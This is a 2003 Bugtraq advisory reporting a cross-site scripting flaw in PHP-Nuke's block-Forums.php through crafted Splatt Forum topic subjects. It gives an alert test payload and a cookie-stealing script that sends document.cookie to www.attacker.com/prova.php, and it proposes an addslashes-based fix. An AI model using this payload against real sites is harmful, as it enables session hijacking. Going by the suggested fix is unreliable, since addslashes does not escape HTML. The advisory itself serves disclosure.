
Date: 31 Mar 2003 11:15:54 -0000
From: <lethalman@...ero.it>
To: bugtraq@...urityfocus.com
Subject: PHP-Nuke block-Forums.php subject vulnerabilities




The block-Forums.php file have a vuln if an attacker
insert a malformatted subject to a topic of Splatt
Forum. A type of subject is:

">&lt;script&gt;alert('bug'");&lt;/script&gt;

The 'alt' tag is closed by "> and the other text is
normal html. This bug is very bad if a subject is:

">&lt;script&gt;window.open('www.attacker.com/prova.php?cookie='+document.cookie);&lt;/script&gt;

And prova.php register cokkies in a file.

The solution:

Add under "$title2 = stripslashes($title2);" line, this
line:
"$title2 = addslashes($title2);"

And now, backward any " there is a backslash!


